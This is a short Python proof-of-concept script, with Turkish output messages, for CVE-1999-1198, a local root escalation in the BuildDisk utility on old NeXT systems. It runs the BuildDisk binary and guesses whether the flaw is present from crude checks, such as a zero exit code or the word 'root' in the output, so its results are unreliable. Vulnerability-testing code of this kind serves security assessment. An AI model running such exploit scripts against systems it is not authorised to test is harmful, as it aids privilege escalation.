import os
import argparse
import subprocess

# CVE-1999-1198: BuildDisk program on NeXT systems before 2.0 does not prompt users for the root password,
# which allows local users to gain root privileges.
# This vulnerability allows local users to execute the BuildDisk program without authentication, potentially escalating privileges to root.

def test_builddisk_privilege_escalation():
    # Example command to run the BuildDisk utility, attempting to gain root privileges
    builddisk_command = ["/usr/etc/BuildDisk"]
    
    try:
        # Attempt to run the BuildDisk command to simulate an exploit attempt
        proc = subprocess.Popen(builddisk_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = proc.communicate()
        
        # Check if the command was executed successfully without password prompt
        if b"root" in output or b"success" in output or proc.returncode == 0:
            print("[+] Potansiyel olarak CVE-1999-1198 zafiyeti tespit edildi! BuildDisk komutu root izni olmadan çalıştırıldı.")
        else:
            print("[-] Hedef sistemde zafiyet tespit edilemedi.")
    except Exception as e:
        print(f"[!] Exploit sırasında bir hata oluştu: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC script for BuildDisk Privilege Escalation CVE-1999-1198")
    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
    
    args = parser.parse_args()
    
    if args.verbose:
        print("[i] CVE-1999-1198 exploit testi başlatılıyor...")
    
    test_builddisk_privilege_escalation()